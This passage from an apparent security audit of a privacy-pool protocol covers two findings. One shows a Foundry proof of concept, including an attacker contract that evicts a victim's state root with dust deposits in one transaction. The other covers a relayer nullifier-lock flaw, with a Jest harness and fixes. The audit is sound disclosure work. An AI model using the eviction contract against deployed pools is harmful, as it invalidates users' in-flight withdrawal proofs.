  function test_PriceOfOneEviction() external {
    _dustDeposit(victim, 0xF00D);
    uint256 _R = _headRoot();

    uint256 _before = gasleft();
    for (uint256 i; i < 16; ++i) _dustDeposit(attacker, 0xD0000 + i);
    uint256 _gas16 = _before - gasleft();

    assertFalse(vault.isKnownRoot(_R), 'evicted');
    console.log('gas for 16 dust deposits (one eviction):', _gas16);
    console.log('gas per dust deposit (avg):', _gas16 / 16);
    console.log('attacker principal (wei, all recoverable): 16');

    // a single relay needs 16 advances; a 10-item relayBatch needs only 7
    uint256 _before7 = gasleft();
    for (uint256 i; i < 7; ++i) _dustDeposit(attacker, 0xE0000 + i);
    console.log('gas for 7 dust deposits (kills a 10-item relayBatch):', _before7 - gasleft());
  }

  /*//////////////////////////////////////////////////////////////
      case E — the real deposit-circuit verifier gas the mock omits
  //////////////////////////////////////////////////////////////*/

  function test_RealDepositVerifierGas() external {
    DepositGroth16Verifier _real = new DepositGroth16Verifier();
    uint256[2] memory _pA = [uint256(1), uint256(2)];
    uint256[2][2] memory _pB = [[uint256(3), uint256(4)], [uint256(5), uint256(6)]];
    uint256[2] memory _pC = [uint256(7), uint256(8)];
    uint256[4] memory _pub = [uint256(11), uint256(12), uint256(13), uint256(14)];

    // NOTE: foundry.toml sets gas_limit = type(int64).max, which makes a bare
    // `gasleft()` delta meaningless across a call. Cap the call so the delta is real.
    uint256 _before = gasleft();
    (bool _ok, bytes memory _ret) = address(_real).staticcall{gas: 3_000_000}(
      abi.encodeWithSelector(DepositGroth16Verifier.verifyProof.selector, _pA, _pB, _pC, _pub)
    );
    uint256 _gas = _before - gasleft();
    console.log('real deposit Groth16 verifyProof gas (full pairing path):', _gas);
    console.log('call succeeded (did not revert):', _ok);
    console.log('verification result for garbage input:', abi.decode(_ret, (bool)));
  }

  /*//////////////////////////////////////////////////////////////
      case F — the whole eviction fits in ONE transaction
  //////////////////////////////////////////////////////////////*/

  /// @dev The deposit circuit's public signals are [outputCommitment, tokenId, value, context]
  ///  (ProofLibV2.sol:80-106) — it does NOT commit to a state root. So N deposit proofs are
  ///  mutually independent, can be generated in parallel off-chain ahead of time, and can be
  ///  replayed from a single contract in one transaction. That turns "front-run the batch with
  ///  16 txs" into "front-run it with one".
  function test_WholeEvictionInASingleTransaction() external {
    _dustDeposit(victim, 0xBEEF01);
    uint256 _R = _headRoot();
    assertTrue(vault.isKnownRoot(_R), 'R known before the single-tx attack');

    F16Compressor _bot = new F16Compressor(entrypoint, noteData, noteContext);
    vm.deal(address(this), 16);
    // ONE external call. 16 root advances.
    _bot.compress{value: 16}(16);

    assertFalse(vault.isKnownRoot(_R), 'one transaction evicted the victim root');
    assertEq(address(vault).balance, 17, 'still only dust principal, all ragequit-recoverable');
  }
}

/// @notice Minimal attacker contract: N dust deposits in a single transaction.
contract F16Compressor {
  Entrypoint internal immutable EP;
  bytes32 internal immutable HINT;
  uint256 internal immutable CTX;

  constructor(Entrypoint _ep, IPoolVault.NoteData memory _note, uint256 _ctx) {
    EP = _ep;
    HINT = _note.hint;
    CTX = _ctx;
  }

  function compress(uint256 _n) external payable {
    IPoolVault.NoteData memory _note = IPoolVault.NoteData({hint: HINT, data: ''});
    for (uint256 i; i < _n; ++i) {
      ProofLibV2.DepositProof memory _p;
      _p.pA = [uint256(1), uint256(2)];
      _p.pB = [[uint256(3), uint256(4)], [uint256(5), uint256(6)]];
      _p.pC = [uint256(7), uint256(8)];
      _p.pubSignals[0] = uint256(keccak256(abi.encode('f16', i)));
      _p.pubSignals[1] = uint256(uint160(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE));
      _p.pubSignals[2] = 1;
      _p.pubSignals[3] = CTX;
      EP.deposit{value: 1}(_p, _note, '');
    }
  }
}
```

#### Recommendation

We recommend converting the state-root window from an operation count to a wall-clock one, since the quantity a proof needs to outlive is proving and queueing time while the buffer is currently denominated in a unit an unprivileged third party sets. Keep a `mapping(uint256 root => uint256 insertedAt)` alongside the ring and accept a root while `block.timestamp - insertedAt < stateRootLiveness`. That also replaces `isKnownRoot`'s O(`rootHistorySize`) scan on `transact`'s hot path with a single lookup, and it brings the state root into line with the keystore's existing `previousRoots` and `keystoreRootLiveness` design, whose window is already tunable through `Keystore.setKeystoreRootLiveness`. If the ring is kept, add the setter it is missing and widen the window: `rootHistorySize` is written once inside `__RootBufferUpgradeable_init` and is the only tunable in the system with no `UPGRADER_ROLE` setter, so today it cannot be changed without a UUPS implementation upgrade. A naive setter is unsafe on its own, because `roots` is a mapping rather than an array: shrinking then growing re-admits stale roots into the scan, and resetting `currentRootIndex` makes the genuinely latest root read as unknown until `newSize` fresh roots have been written, so the setter has to rewrite the buffer coherently. Raising `vettingFeeBPS` is not a substitute. At `minAmount = 1` no admissible value produces a nonzero fee, and only raising `minAmount` and `vettingFeeBPS` together so their product reaches 10,000 prices a deposit advance at all; that is available to `ENTRYPOINT_MANAGER_ROLE` without an upgrade and is a reasonable stop-gap, but it prices only the deposit route and leaves the identity self-transact route untouched.

We also recommend closing the re-validation gap on both clients. Call the already-implemented `PoolVaultInteractor.isKnownRoot` in the SDK immediately before handing a proof to the relayer, add a re-prove path to `TransactOrchestrator` so an eviction is recovered without user action, and have the relayer check every item's `stateRoot` and the batch's worst case, `U + count - 1 < rootHistorySize`, at the `pending` block tag rather than relying on the structural comparison in `assertBatchFitsRootHistory`. Give `rootHistorySizeCache` and `relayMaxBatchCache` a TTL in the style of the `GAS_PRICE_TTL_MS` already guarding `gasPriceCache` in the same file, so a `PoolVault` upgrade that shrank the buffer cannot be missed until the process restarts. On the documentation side, correct residual B-1 in `agents/deviations.md`, which states that the relayer re-checks the coupling live before every batch when what it reads is a process-lifetime cache, and qualify the shared-snapshot language in the `_MAX_BATCH` comment and in the SDK's `MAX_BATCH` docblock so it says what the constructor guard actually buys: safety against the batch's own nine in-transaction advances, and nothing about advances that land before the batch does.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #021 — `withNullifierLock` releases at broadcast rather than at inclusion, so a duplicate relay burns the relayer's gas

**Severity:** Low · **Location:** `packages/relayer/relayer/src/chain.service/evm.chain.service.ts` · **Bug:** High · **Payout:** Low · **Novelty:** DIFF · **Reach:** PERM · **Status:** Open

#### Description

A withdrawal from the pool burns a note and pays out its value. The holder does not send that transaction, because sending it would tie the spend to an address that pays gas, the exact linkage the pool exists to avoid; instead the holder hands the proof to a relayer, which signs and broadcasts it from a wallet of its own, an externally owned account (EOA), pays the gas, and takes a fee out of the withdrawal. What the pool records on chain is the note's nullifier, the one-time identifier marking it spent, after which any transaction spending that note reverts. The relayer staying funded is therefore a user-facing property rather than an operator convenience.

Duplicate requests are ordinary traffic. A client that does not get a reply re-sends, and the proof and the signed fee quote it carries stay valid for the minute the quote lives, so two transactions can end up spending the same note; the second cannot succeed, and it is the relayer's wallet rather than the holder's that pays for it. The design has a remedy and names it: the relayer keeps the nullifiers it has in flight in a set, locks out any second request naming one of them, and tells that caller a transaction spending the note "is pending confirmation" and to "wait for it to settle and retry".

**Where it breaks.** The refusal is armed for the wrong interval. Two spans are involved and they do not coincide:

- the lock is taken when the request arrives and released as soon as the node accepts the transaction into its mempool, a span of a few hundred milliseconds;
- the note stays spendable until that transaction is included in a block, which on the layer-2 networks this relayer serves can be minutes later.

For the whole gap between the two the lock is open and the chain still shows the note unspent, so a re-sent request clears the check, simulates cleanly, and is signed and broadcast a second time.

Each such duplicate costs the relayer a full proof verification, roughly half the gas of a successful relay, with no fee and no error to show for it, and when the wallet finally empties the relay stops and every holder is left self-submitting a withdrawal from an address of their own, which is the linkage the relayer exists to prevent.

In `PoolVault`, `transact` verifies a spend proof and then writes `$.spentNullifiers[_nullifierHash] = block.timestamp`, after which any proof reusing that note reverts.

Broadcasting is not the same as landing. `walletClient.writeContract` returns a hash as soon as the node accepts the raw transaction into its mempool, without waiting for a block, so anything simulating against the latest block before inclusion sees a world in which the spend has not happened.

`withNullifierLock` exists because of that interval: when a second request arrives for a note whose spend is already in flight, the relayer should refuse it rather than pay for a transaction guaranteed to revert against `PoolVault`'s replay guards, since a reverting transaction still consumes gas charged to the relayer's own EOA and earns no fee. But the guard is released in a `.finally()` attached to the function that performs the write, and every such function ends at `walletClient.writeContract(request)`, so it covers simulate to broadcast and nothing after it:

```ts
// EVMChainService.withNullifierLock, collision check through release
const keys = nullifiers.map((n) => `${this.chainId}:${n}`);
const collision = keys.find((k) => inFlightNullifiers.has(k));
if (collision) {
    const hash = collision.slice(collision.indexOf(":") + 1);
    throw new BadRequestException(
        `Nullifier ${hash} is already in-flight — ` +
            `a transaction spending this note is pending confirmation. ` +
            `Wait for it to settle and retry.`
    );
}
keys.forEach((k) => inFlightNullifiers.add(k));
return fn().finally(() => keys.forEach((k) => inFlightNullifiers.delete(k)));
```

The covered interval is a few hundred milliseconds; the interval in which a duplicate does damage is broadcast to inclusion, and the lock is open for all of it. No relay path closes that gap from the other side. Searching `packages/relayer` for `waitForTransactionReceipt`, excluding `node_modules`, spec and e2e files, returns only `EVMChainService.waitForTransactionReceipt`, its body, and one production caller, `DustRescueForwardingService.forward`, which runs after `simulateAndWriteRelaySwap` has already returned and dropped the lock. Every `receipt.status` hit is in the separate `dust-rescue-service` or in e2e tests, none on a relay route, and `EvmRelayService.withdrawal`, `.registerAndWithdrawal`, `.relayAndAnnounce`, `.transfer`, `.batchWithdrawal` and `.relaySwap` all return a `{ txHash }` produced at broadcast, which `RelayController` hands straight back to the caller. A receipt await inside any of the six locked bodies, or a `receipt.status` gate in `EvmRelayService`, would falsify this, and there is neither.

Three artifacts claim the stronger guarantee: the comment on `inFlightNullifiers` says the Set "Prevents duplicate or overlapping-nullifier requests from redundant simulations and on-chain reverts"; the `BadRequestException` tells the caller a transaction spending the note "is pending confirmation" and to "wait for it to settle and retry"; and `evm.chain.service.nullifier-lock.spec.ts` pins the weaker behaviour with a green test titled "releases the lock after a successful broadcast so a later retry succeeds".

| t | Event | State the code assumes | Actual state |
| --- | --- | --- | --- |
| t0 | Client POSTs a relay withdrawal with proof P spending nullifier N | | |
| t1 | `withNullifierLock` adds `chainId:N` to `inFlightNullifiers`; `simulateContract` at `latest` succeeds | N unspent | N unspent |
| t2 | `writeContract` broadcasts tx1 and the promise resolves | tx1 will settle | tx1 is in the mempool |
| t3 | The `.finally()` in `withNullifierLock` deletes `chainId:N` | settled | not mined |
| t4 | The same client re-POSTs the identical payload | N is in flight, reject | the lock is free, accept |
| t5 | Simulation at `latest`: tx1 is still unmined, so the replay guards pass | would revert | succeeds |
| t6 | `writeContract` broadcasts tx2 | | two transactions spend N |
| t7 | tx1 mines and `PoolVault.transact` writes `spentNullifiers[N]` | | |
| t8 | tx2 mines and reverts | | the relayer pays for every unit of gas tx2 consumed |

The duplicate is not cheap, because the proof is verified before either replay guard runs. `PoolVault.transact` calls `_validateAndVerify`, which checks the state, keystore and ASP (association-set provider) roots and then runs the Groth16 `_verifyProof`, the pairing check that is the zero-knowledge verification itself; only afterwards do the output-commitment and nullifier loops execute. A replayed proof carries the same output commitments, and every committed `transact_NxM` circuit variant, N input notes to M output notes, has at least one, so it hits `PoolVault_CommitmentAlreadyUsed()` rather than `PoolVault_NullifierAlreadySpent()` below it. That changes only the error in a trace; either way the pairing check has been paid for.

Six methods pass through the lock, covering the whole relay surface: `simulateAndWriteRelayTransfer`, `simulateAndWriteRelaySwap`, `simulateAndWriteRelay` (aliased by `simulateAndWriteRelayWithdrawal`), `simulateAndWriteRegisterAndRelay`, `simulateAndWriteRelayAndAnnounce` and `simulateAndWriteRelayBatch`. Seven `writeContract(request)` calls sit inside them, because `simulateAndWriteRelay` has two, the default `PrivacyPoolRelay.relay` path and the `PPRouter.withdrawToUnderlying` branch for an allowlisted alternate processor, which releases at the same point. A release bound to inclusion, the `.finally()` resolving only once a receipt is in hand, would falsify all of this, and so would a `blockTag: "pending"` on the locked bodies' `simulateContract` calls, since a duplicate simulated against the pending block would revert before anything was signed. Neither holds: every locked body's last statement is `writeContract(request)`, and no `simulateContract` call in `EVMChainService` pins a block tag or number.

`inFlightNullifiers` is a module-level `Set` by necessity, since `EVMChainService` carries `@Injectable({ scope: Scope.REQUEST })` and cannot hold cross-request state, and nothing backs it with a shared store: searching `packages/relayer/relayer/src` for `redis`, `ioredis`, `firestore`, `advisory` and `lease` puts Firestore only in the separate `dust-rescue-service`, with the only `lease` matches inside the word "released". `ThrottlerModule.forRoot([...])` passes no `storage` option either, so the `{ name: "relay", ttl: 60_000, limit: 5 }` budget is per process as well. A `storage` provider or a Redis client anywhere in the package would falsify both claims, and there is neither.

What that means in deployment is bounded by what the repository can show. Neither `gcloud run deploy` invocation passes a scaling flag, only `--image` and `--region`, and a search of `*.yml`, `*.yaml`, `*.json`, `*.ts` and `Dockerfile*` finds no `--max-instances`, `--min-instances`, `--concurrency` or `maxScale`, with no Terraform or Kubernetes manifest in the tree. That is not a claim that the live service runs more than one replica: `gcloud run deploy` preserves values set out of band, and the deployed configuration was not available, which `gcloud run services describe <relayer-service> --region <GCP_REGION>` would settle. Replica count decides only whether a duplicate must win a race inside one block or arrives deterministically on a second process holding its own empty `Set`.

The request that produces a duplicate is cheap to repeat, and no attacker is needed to produce one. A signed fee commitment is checked for staleness and never marked consumed: `verifyRelayWithdrawalCommitment`, `verifyRelayBatchWithdrawalCommitment`, `verifyRelayTransferCommitment` and `verifyRelaySwapCommitment` each guard on `if (Date.now() > expiration)` and nothing more, `quote_expiration_ms` defaults to `60000`, and nothing keys on `signedRelayerCommitment`, so one commitment and one proof can be re-POSTed for its whole lifetime. The relay routes also have no route-level timeout: every `QUOTE_DEADLINE_MS`, `QuoteDeadlineInterceptor` and `quoteDeadline` hit is in `quote/`, `relay.module.ts` and `relay.controller.ts` carry no `@UseInterceptors`, and `AppModule` registers only `ThrottlerGuard` and `RequestLogInterceptor` globally. A globally registered timeout interceptor would falsify that, and there is none, so an ordinary client retrying a slow relay POST reproduces the duplicate.

Separately, the `keys.find((k) => inFlightNullifiers.has(k))` collision test compares the incoming keys only against keys already held and never against each other, so a request carrying the same nullifier twice passes the guard, and `simulateAndWriteRelayBatch` flattens nullifiers across every proof with `payload.proofs.flatMap(...)` before taking the lock, so a batch repeating one note in two items reaches the chain and reverts there.

The ceiling is the relayer's own gas, and that is structural. `PoolVault.transact` writes `$.spentNullifiers[_nullifierHash]` before `_transferAsset` and is `nonReentrant`, so a duplicate cannot double-spend, move a token, or corrupt state. Once the first transaction mines the nullifier is spent and every further duplicate dies in simulation before broadcast, so sustained griefing needs a stream of fresh notes, each carrying a real deposit and its vetting fee.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L557-L579
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L126-L129
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L491-L497
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.nullifier-lock.spec.ts#L117-L123
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L152-L175
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/app.module.ts#L16-L19

#### Impact

Each duplicate costs the operator a full Groth16 verification. Measured against the repository's own committed verifiers rather than extrapolated from the relayer's estimate, `verifyProof` costs 238,581 gas for `transact_1x1`, 252,039 for `transact_2x2` and 292,413 for `transact_5x5`; adding the 21,000 intrinsic, the transact calldata, the three root SLOADs and the first `_commitmentExists` SLOAD puts a realistic reverting duplicate at roughly 280,000 to 350,000 gas, an addition that is computed rather than measured. Against `EvmQuoteService.relayTxCost` of `Gas(650_000n)`, a revert costs the operator roughly half a successful relay and earns nothing. A batch is worse by construction: `PrivacyPoolRelay.relayBatch` calls `POOL.transact` for every item inside one transaction with no per-item recovery, so a collision on the last item pays for every earlier item's verification before the whole batch reverts, a floor of 2,520,390 gas of verifier work at `_MAX_BATCH` of 10.

The costly case is the silent one. A duplicate arriving before the first transaction is included broadcasts, reverts on chain and logs nothing, because from the relayer's point of view it obtained a hash and succeeded; one arriving after inclusion fails in simulation, costs nothing and logs an ERROR through `failWrite`. Searching `packages/relayer/relayer/src` for `prometheus`, `opentelemetry`, `@nestjs/terminus`, `metrics`, `datadog` and `sentry` returns zero files, and `gasBump`, `replacement`, `rebroadcast`, `maxFeePerGas` and `speedUp` return nothing either. The one operator page is the `this.logger.turbo(...)` call in `failWrite`, which `FATLogger`'s `GCP_SEVERITY` map raises to `CRITICAL`, reached only when `isOutOfFundsError` returns true, so the operator is paged once the signer wallet is empty rather than while it drains.

If the hot wallet empties, `failWrite` turns every relay into a `ServiceUnavailableException`. No user funds are locked, since self-submission remains available, but self-submission is the path that links a withdrawal to a gas-paying EOA, so the property that degrades is privacy rather than custody.

#### Proof of concept

The release point was tested rather than only read off the source. `lock-release-point.spec.ts`, reproduced in full below, is a Jest harness written outside the repository that drives the unmodified `EVMChainService` at this commit, with only its private `client()` and `signer()` accessors replaced by instrumented doubles. It runs from `packages/relayer/relayer` with `npx --no-install jest --config <this dir>/jest.config.js --verbose`, and it passes six tests.

With `waitForTransactionReceipt` stubbed to a promise that never settles, two byte-identical `simulateAndWriteRelay` calls for the same nullifier both resolve, with `simulateContract` called twice, `writeContract` called twice and `waitForTransactionReceipt` called zero times. A second test pins the lock's lifetime to exactly `[acquire, writeContract resolution]`: while the deferred `writeContract` is unresolved the duplicate is rejected with "already in-flight", and the instant it resolves the duplicate is admitted. A third shows that the same nullifier twice inside one payload passes the collision test in `withNullifierLock`. A fourth models two processes with two isolated module registries and shows the second admits a nullifier the first is holding, while a second `EVMChainService` instance inside the same registry is correctly rejected. A fifth reproduces the release point on `simulateAndWriteRelayTransfer` and `simulateAndWriteRegisterAndRelay`.

The sixth is the control, and it is what makes the other five mean anything. It swaps `withNullifierLock` on the prototype for the fix recommended below and re-runs the first test's scenario against identical stubs; under the mutant the duplicate is refused, `writeContract` stays at one call and `waitForTransactionReceipt` is called once, so the two broadcasts in the first test are caused by the release point rather than by the stubbing. The `blockTag: "pending"` alternative is not exercised here, because `simulateContract` is a stub and never evaluates a block tag, so that leg rests on reading the source, where no `simulateContract` call in `EVMChainService` pins a tag or a block number.

The gas figures come from a standalone Foundry project that reaches the committed verifiers through symlinks, so nothing was written into the source tree. The proof points are the bn254 generators; they are on curve, so every precompile performs its full work and is charged for it, and the pairing simply reports a mismatch. EIP-1108 costs are fixed and outcome-independent, so the gas matches what a real proof would cost.

Nothing beyond that was executed. No fork test and no integration test was run, and no call was made against a live relayer. The on-chain half of the argument, that the duplicate's revert lands on the commitment guard in `PoolVault.transact` after the verifier has run, is traced through source and supported by the measured verifier gas rather than demonstrated end to end against a deployed pool. The deployed Cloud Run configuration was not observed.

`lock-release-point.spec.ts` in full:

```ts
/**
 * Proof of concept. Not part of the repository's own test suite.
 *
 * Purpose: settle by EXECUTION, not by reading, the two near-binary legs of the finding:
 *
 *   Leg 1 (release point) — does `withNullifierLock`'s `fn().finally(...)` release the lock at
 *          BROADCAST (writeContract resolving a tx hash) or at INCLUSION (a receipt)?
 *   Leg 2 (per-process scope) — is `inFlightNullifiers` module-level state, i.e. does a second
 *          process/replica share it?
 *
 * Runs against the repository's unmodified source at commit 638bf8f4. Nothing in the repository tree is
 * written to. Invoke with the sibling config:
 *
 *   cd <repo>/packages/relayer/relayer
 *   npx --no-install jest --config <this dir>/jest.config.js --verbose
 */
import "reflect-metadata";

const REPO_ROOT = process.env.REPO_ROOT ?? "<absolute path to the repository root>";
const SERVICE_PATH =
    REPO_ROOT +
    "/packages/relayer/relayer/src/chain.service/evm.chain.service";

const TX_HASH = "0xabc0000000000000000000000000000000000000000000000000000000000abc";
const SIGNER_ADDRESS = "0x0000000000000000000000000000000000000001";
const RELAY_CONTRACT = "0x5FbDB2315678afecb367f032d93F642f64180aa3";

const mockConfig = {
    signerPrivateKey: () => "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    chainConfig: () => ({ name: "anvil" }),
    nativeCurrency: () => ({ name: "Ether", symbol: "ETH", decimals: 18 }),
    rpcUrl: () => "http://localhost:8545",
    relayContractAddress: () => RELAY_CONTRACT,
    poolVaultContractAddress: () => RELAY_CONTRACT,
    chainId: () => "31337",
};

const mockLogger = {
    log: jest.fn(), info: jest.fn(), error: jest.fn(), turbo: jest.fn(),
    warn: jest.fn(), debug: jest.fn(), verbose: jest.fn(), setContext: jest.fn(),
};

const CTX = { chainType: "EVM", chainId: "31337" };

function makePayload(nullifierHashes: string[]): any {
    return {
        proof: {
            pA: [0n, 0n],
            pB: [[0n, 0n], [0n, 0n]],
            pC: [0n, 0n],
            pubSignals: [],
            parsedPubSignals: { nullifierHashes },
        },
        noteData: [],
        data: "0x00",
    };
}

/** Flush the microtask queue a few times so pending `await`s inside fn() make progress. */
const tick = async (n = 6) => { for (let i = 0; i < n; i++) await Promise.resolve(); };

interface Stubs {
    simulateContract: jest.Mock;
    writeContract: jest.Mock;
    waitForTransactionReceipt: jest.Mock;
}

/** Replace the service's private client()/signer() with instrumented doubles. */
function stub(service: any, writeImpl?: () => Promise<unknown>): Stubs {
    const simulateContract = jest.fn(async () => ({ request: {} }));
    // A receipt wait that NEVER settles: models a transaction sitting in the mempool.
    const waitForTransactionReceipt = jest.fn(() => new Promise(() => { /* never */ }));
    const writeContract = jest.fn(writeImpl ?? (async () => TX_HASH));
    jest.spyOn(service, "client").mockResolvedValue({ simulateContract, waitForTransactionReceipt } as any);
    jest.spyOn(service, "signer").mockResolvedValue({
        account: { address: SIGNER_ADDRESS },
        writeContract,
    } as any);
    return { simulateContract, writeContract, waitForTransactionReceipt };
}

describe("nullifier lock release point", () => {
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const { EVMChainService } = require(SERVICE_PATH);
    const newService = () => new EVMChainService(CTX as any, mockLogger as any, mockConfig as any);

    afterEach(() => jest.restoreAllMocks());

    it("T1 — a second broadcast of the SAME nullifier is accepted while tx1 has no receipt", async () => {
        const s = newService();
        const { simulateContract, writeContract, waitForTransactionReceipt } = stub(s);

        // Request 1: broadcast succeeds. The transaction is NOT mined (waitForTransactionReceipt
        // would never settle) — but nothing inside the lock consults it.
        await expect(s.simulateAndWriteRelay(makePayload(["0x1111"]))).resolves.toBe(TX_HASH);

        // Request 2: byte-identical payload, same nullifier, tx1 still unmined.
        await expect(s.simulateAndWriteRelay(makePayload(["0x1111"]))).resolves.toBe(TX_HASH);

        expect(simulateContract).toHaveBeenCalledTimes(2);
        expect(writeContract).toHaveBeenCalledTimes(2); // <-- TWO on-chain broadcasts, one nullifier
        expect(waitForTransactionReceipt).not.toHaveBeenCalled(); // <-- lock never waits for inclusion
    });

    it("T2 — the lock's lifetime ends EXACTLY at writeContract's resolution, not before, not after", async () => {
        const s = newService();
        let releaseBroadcast!: (h: string) => void;
        const { writeContract } = stub(
            s,
            () => new Promise<string>((res) => { releaseBroadcast = res; })
        );

        const inFlight = s.simulateAndWriteRelay(makePayload(["0x2222"]));
        await tick(); // simulate resolved; writeContract entered and is pending

        // WHILE the write promise is unresolved the guard DOES hold. This is the counterfactual
        // for the recommended fix: if fn() awaited a receipt, this rejection is what a duplicate
        // would get for the whole mempool residence time.
        await expect(s.simulateAndWriteRelay(makePayload(["0x2222"]))).rejects.toThrow(/already in-flight/);
        expect(writeContract).toHaveBeenCalledTimes(1);

        releaseBroadcast(TX_HASH); // eth_sendRawTransaction returned. Tx is in the mempool, unmined.
        await expect(inFlight).resolves.toBe(TX_HASH);

        // Subsequent broadcasts resolve promptly (the deferred impl was for tx1 only).
        writeContract.mockImplementation(async () => TX_HASH);

        // Immediately after broadcast — still unmined — the same nullifier is admitted again.
        await expect(s.simulateAndWriteRelay(makePayload(["0x2222"]))).resolves.toBe(TX_HASH);
        expect(writeContract).toHaveBeenCalledTimes(2);
    });

    it("T3 — duplicate nullifiers WITHIN one request are not caught (keys never compared to itself)", async () => {
        const s = newService();
        const { writeContract } = stub(s);
        await expect(s.simulateAndWriteRelay(makePayload(["0x3333", "0x3333"]))).resolves.toBe(TX_HASH);
        expect(writeContract).toHaveBeenCalledTimes(1);
    });

    it("T4 — the lock is process-scoped: a second module registry (= a second replica) shares nothing", async () => {
        // Two independent module registries model two Cloud Run instances of the same image.
        let ModA: any, ModB: any;
        jest.isolateModules(() => { ModA = require(SERVICE_PATH); });
        jest.isolateModules(() => { ModB = require(SERVICE_PATH); });
        expect(ModA.EVMChainService).not.toBe(ModB.EVMChainService); // genuinely distinct copies

        const a1 = new ModA.EVMChainService(CTX, mockLogger, mockConfig);
        const a2 = new ModA.EVMChainService(CTX, mockLogger, mockConfig); // Scope.REQUEST: new per request
        const b1 = new ModB.EVMChainService(CTX, mockLogger, mockConfig);

        let releaseBroadcast!: (h: string) => void;
        stub(a1, () => new Promise<string>((res) => { releaseBroadcast = res; }));
        const sA2 = stub(a2);
        const sB1 = stub(b1);

        const held = a1.simulateAndWriteRelay(makePayload(["0x4444"]));
        await tick();

        // Same process, DIFFERENT request-scoped service instance -> the module-level Set catches it.
        await expect(a2.simulateAndWriteRelay(makePayload(["0x4444"]))).rejects.toThrow(/already in-flight/);
        expect(sA2.writeContract).not.toHaveBeenCalled();

        // Different process (module registry) -> no shared store, so it broadcasts.
        await expect(b1.simulateAndWriteRelay(makePayload(["0x4444"]))).resolves.toBe(TX_HASH);
        expect(sB1.writeContract).toHaveBeenCalledTimes(1);

        releaseBroadcast(TX_HASH);
        await held;
    });

    /**
     * T6 is the falsification control. T1-T5 only mean something if this harness would have
     * REJECTED the finding had the code held the lock to inclusion. Here the ONLY thing changed
     * is the release point — `withNullifierLock` is replaced on the prototype with the fix the
     * finding recommends (release inside the receipt wait's finally). Everything else, including
     * the never-settling receipt stub, is identical to T1. If T1's result were an artefact of the
     * stubbing rather than of the release point, T6 would pass identically. It does not.
     */
    it("T6 — MUTATION CONTROL: with release-at-inclusion, the very same T1 duplicate is refused", async () => {
        const s = newService();
        const { writeContract, waitForTransactionReceipt } = stub(s);

        const patchedSet = new Set<string>();
        const proto = Object.getPrototypeOf(s);
        const original = proto.withNullifierLock;
        proto.withNullifierLock = function (nullifiers: string[], fn: () => Promise<string>) {
            const keys = nullifiers.map((n) => `${(this as any).chainId}:${n}`);
            const collision = keys.find((k) => patchedSet.has(k));
            if (collision) throw new Error(`Nullifier ${collision} is already in-flight`);
            keys.forEach((k) => patchedSet.add(k));
            // THE FIX: keep the key, spawn the receipt wait, release in THAT wait's finally.
            return fn().then((hash) => {
                void (this as any)
                    .client()
                    .then((c: any) => c.waitForTransactionReceipt({ hash }))
                    .finally(() => keys.forEach((k) => patchedSet.delete(k)));
                return hash;
            });
        };

        try {
            await expect(s.simulateAndWriteRelay(makePayload(["0x1111"]))).resolves.toBe(TX_HASH);
            await tick(10); // let the spawned receipt wait attach; it never settles
            // Same duplicate T1 admitted — now refused, because tx1 has no receipt.
            await expect(s.simulateAndWriteRelay(makePayload(["0x1111"]))).rejects.toThrow(/already in-flight/);
            expect(writeContract).toHaveBeenCalledTimes(1); // one broadcast, not two
            expect(waitForTransactionReceipt).toHaveBeenCalledTimes(1); // the lock now DOES wait
        } finally {
            proto.withNullifierLock = original;
        }
    });

    it("T5 — every simulateAndWrite* entry point shows the same release point", async () => {
        const s = newService();
        const { writeContract, waitForTransactionReceipt } = stub(s);
        // Transfer path and swap path are the two that do not need extra config/branching.
        await expect(s.simulateAndWriteRelayTransfer(makePayload(["0x5555"]))).resolves.toBe(TX_HASH);
        await expect(s.simulateAndWriteRelayTransfer(makePayload(["0x5555"]))).resolves.toBe(TX_HASH);
        await expect(
            s.simulateAndWriteRegisterAndRelay({
                ...makePayload(["0x6666"]),
                registration: {
                    account: SIGNER_ADDRESS, authDigest: "0x1", nullifyingKeyHash: "0x2",
                    deadline: "0x3", signature: "0x00",
                },
            })
        ).resolves.toBe(TX_HASH);
        await expect(
            s.simulateAndWriteRegisterAndRelay({
                ...makePayload(["0x6666"]),
                registration: {
                    account: SIGNER_ADDRESS, authDigest: "0x1", nullifyingKeyHash: "0x2",
                    deadline: "0x3", signature: "0x00",
                },
            })
        ).resolves.toBe(TX_HASH);
        expect(writeContract).toHaveBeenCalledTimes(4);
        expect(waitForTransactionReceipt).not.toHaveBeenCalled();
    });
});
```

#### Recommendation

We recommend that the lock stop being released by the `fn().finally(...)` in `withNullifierLock` and instead be released by a bounded receipt watcher: keep the key, return the hash to the caller immediately, and delete the key from the watcher's own `finally` once `waitForTransactionReceipt` settles, with a timeout and a `spentNullifiers(N)` probe so a dropped transaction cannot wedge a key permanently. Moving the release point to an awaited receipt inside the locked region is not an adequate substitute: inclusion can be minutes away on the L2s this relayer serves, and a client whose proof is invalidated in flight, by an evicted state root or a rotated ASP root, has to re-prove and re-submit the same nullifier to recover, so a lock held to inclusion would refuse that legitimate retry for the whole window. A bounded lease closes the gap without opening that one.

